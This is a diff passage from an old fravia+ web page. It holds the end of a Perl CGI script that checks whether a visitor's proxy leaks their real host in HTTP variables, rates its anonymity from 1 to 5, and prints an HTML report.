+    if ( ($to_host eq $remote_host) || ($to_ip eq $remote_addr) ) {
+      $spill_addr .= ":x";
+    }
+    unless($seen{$spill_addr}++){}
+    $spill_addr .= "\n";
+  }
+  foreach $spill_addr (@spill_addr) {
+    chop($spill_addr) if ($spill_addr =~ /\n$/);
+    if ($spill_addr !~ /:x/) {
+      $spill_num++;
+      $your_host = $spill_addr;
+    }
+  }
+  if ($spill_num == 0) {
+    $your_host = 'Anonymous';
+  } elsif ($spill_num != 1) {
+    $your_host = 'Anonymous';
+    while (($spill_host, $spill_num) = each %seen) {
+      if ($spill_num &gt; 1) {
+        $your_host = $spill_host;
+        last;
+      }
+    }
+  } else {
+    $addr_top = $remote_addr;
+    $addr_top =~ s/([^\.]+)\.([^\.]+)\.([^\.]+)\..+/$1\.$2\.$3\./;
+    $host_top = $remote_host;
+    if ($host_top =~ /\.[^\.]{2,3}\.[^\.]{2,3}$/) {
+      $host_top =~ s/[^\.]*\.*([^\.]+)\.([^\.]+)\.([^\.]+)$/$1\.$2\.$3/;
+    } else {
+      $host_top =~ s/[^\.]*\.*([^\.]+)\.([^\.]+)$/$1\.$2/;
+    }
+    #-----// ***.***.***.??? //----#
+    if ($your_host =~ /^($addr_top[^\. ]+)/) {
+      $inner = 'true';
+
+    #-----// ??...??.*** //----#
+    } elsif ($your_host =~ /(\.{0,1}$host_top)$/) {
+      $inner = 'true';
+    }
+  }
+  return;
+}
+
+# # # # #
+
+#-----// Judgement //----#
+sub judgement {
+
+  #-----// Low Suspect //----#
+  if ( ($noproxy == 2) && ($result eq '') ) {
+    $result  = 'No proxy!';
+    $comment = 'Like no proxy server.';
+  } elsif ( ($result eq '') && ($keepalive eq '') ) {
+    $result   = 'Anonymized';
+    $comment .= 'No "Connection=Keep-Alive" is dubious';
+  }
+
+  #-----// NoProxy //----#
+  if ($result eq 'NoProxy!') {
+    if ($rh_result eq 'IP Addr.') {
+      $judge     = '1';
+      $j_comment = 'REMOTE_HOST that is IP addr. is precious.';
+    } elsif ($rh_result eq 'Via a Proxy') {
+      $judge     = '3';
+      $j_comment = 'HTTP valuables are checked first.';
+    } elsif ($rh_result eq '?') {
+      $judge     = '2';
+      $j_comment = 'Persistent variable checkers may suspect.';
+    } else {
+      $judge     = '2';
+      $j_comment = 'Useful proxy server.';
+    }
+
+  #-----// Anonymized //----#
+  } elsif ($result eq 'Anonymized') {
+    if ($rh_result eq 'IP Addr.') {
+      $judge     = '2';
+      $j_comment = 'Nice. It it useful.';
+    } elsif ($rh_result eq 'Via a Proxy') {
+      $judge     = '3';
+      $j_comment = 'HTTP valuables are checked first.';
+    } elsif ($rh_result eq '?') {
+      $judge     = '3';
+      $j_comment = 'Persistent valuables checkers may suspect.';
+    } else {
+      $judge     = '2';
+      $j_comment = 'Useful proxy server.';
+    }
+
+  #-----// Via a Proxy //----#
+  } else {
+    if ($rh_result eq 'IP Addr.') {
+      $judge     = '3';
+      $j_comment = 'So-so.';
+    } elsif ($rh_result eq 'Via a Proxy') {
+      $judge     = '5';
+      $j_comment = 'If it is not slow, you can use.';
+    } elsif ($rh_result eq '?') {
+      $judge     = '3';
+      $j_comment = 'So-so.';
+    } else {
+      $judge     = '4';
+      $j_comment = 'If it is not slow, you can use.';
+    }
+  }
+
+  #-----// SPILL //----#
+  if ($your_host ne 'Anonymous') {
+    $judge    .= '?';
+    if ($inner eq 'true') {
+      $j_comment = 'Internal proxy server?';
+    } else {
+      $j_comment = 'Spill your REMOTE_HOST?';
+    }
+    $j_comment .= " ($your_host)";
+  }
+  return;
+}
+
+# # # # #
+
+#-----// Generate HTML document //----#
+sub html {
+  print &lt;&lt;"_HTML_";
+Content-type: text/html
+
+&lt;HTML&gt;
+&lt;HEAD&gt;&lt;TITLE&gt;$title&lt;/TITLE&gt;&lt;/HEAD&gt;
+&lt;BODY $body&gt;
+
+&lt;CENTER&gt;$title&lt;/CENTER&gt;
+
+&lt;P&gt;&lt;HR&gt;&lt;P&gt;
+
+&lt;PRE&gt;
+_HTML_
+  if ($ARGV[0] ne '') {
+   print "itself_host : @itself_host&lt;HR&gt;\n";
+   print "spill_addr : @spill_addr&lt;HR&gt;\n";
+  }
+  if ($chk_rh =~ /color="$warn"/) {
+    print " &lt;FONT color=\"$warn\"&gt;via&lt;/FONT&gt;  - REMOTE_HOST=$chk_rh\n";
+  } elsif ($chk_rh =~ /color="$suspect"/) {
+    print "  &lt;FONT color=\"$suspect\"&gt;?&lt;/FONT&gt;   - REMOTE_HOST=$chk_rh\n";
+  } else {
+    print "        REMOTE_HOST=$remote_host\n";
+  }
+  print "        REMOTE_ADDR=$remote_addr\n\n";
+  foreach $envdat (@envdat) {
+    $envdat =~ s/^[^\t]+\t[^\t]+\t([^\t]+)\t([^\t]+)/$1$2/;
+    if ( ($your_host ne 'Anonymous') && ($envdat =~ /$your_host/) ) {
+      print "&lt;FONT color=\"$warn\"&gt;SPILL&lt;/FONT&gt; - ";
+      if ($envdat !~ /&gt;$your_host&lt;/) {
+        $envdat =~ s/$your_host/&lt;FONT color="$warn"&gt;$your_host&lt;\/FONT&gt;/i;
+      }
+    } elsif ($envdat =~ /color="$warn"/) {
+      print " &lt;FONT color=\"$warn\"&gt;via&lt;/FONT&gt;  - ";
+    } elsif ($envdat =~ /color="$suspect"/) {
+      print "  &lt;FONT color=\"$suspect\"&gt;?&lt;/FONT&gt;   - ";
+    } else {
+      print "        ";
+    }
+    print "$envdat\n";
+  }
+print &lt;&lt;"_HTML_";
+&lt;/PRE&gt;
+
+&lt;P&gt;&lt;HR&gt;&lt;P&gt;
+
+&lt;UL&gt;
+&lt;LI&gt;REMOTE_HOST
+&lt;DL&gt;
+&lt;DT&gt;Result&lt;DD&gt;$rh_result
+&lt;DT&gt;Comment&lt;DD&gt;$rh_comment
+&lt;/DL&gt;&lt;P&gt;
+&lt;LI&gt;HTTP Env. Value
+&lt;DL&gt;
+&lt;DT&gt;Result&lt;DD&gt;$result
+&lt;DT&gt;Comment&lt;DD&gt;$comment
+&lt;/DL&gt;&lt;P&gt;
+&lt;LI&gt;AnonyLevel : &lt;FONT size="+2" color="$levelcolor"&gt;&lt;B&gt;$judge&lt;/B&gt;&lt;/FONT&gt; (1:Nice - 5:Bad)&lt;BR&gt;
+&nbsp; $j_comment&lt;P&gt;
+&lt;/UL&gt;
+&lt;P&gt;
+$nozoki_warn
+&lt;P&gt;&lt;HR&gt;&lt;P&gt;
+
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+_HTML_
+  return;
+}
+
+__END_
+</pre>
+<p><font size=+2 color=blue><center>
+caiaphasp(at)yahoo(point)com
+</center></font><hr>
+</font>
+<!-- internet searching strategies and hints content, end -->
+<center><a href="remobann.htm"><img SRC="images/antiadv.gif" ALT="antiadv" BORDER=0 
+height=43 width=114 align=BOTTOM></a><br><br>
+<!-- how to search the web, by fravia+, signet begin -->
+<table><tR><td width="300" height="2" bgcolor="#993300"></tD></tR></table>
+<bR>
+(c) 2000: <font color=blue>[</font><a
+href="info.htm">fravia+</a><font color=blue><font
+color=blue>]</fonT></font>, all rights reserved
+<br><!-- how to search the web, by fravia+,
+signet end -->
+
+
+<!-- begin da closing bit, duh -->
+
+
+<!-- begin da closing bit, duh -->
+</CENTER>
+</body>
+</HTML>
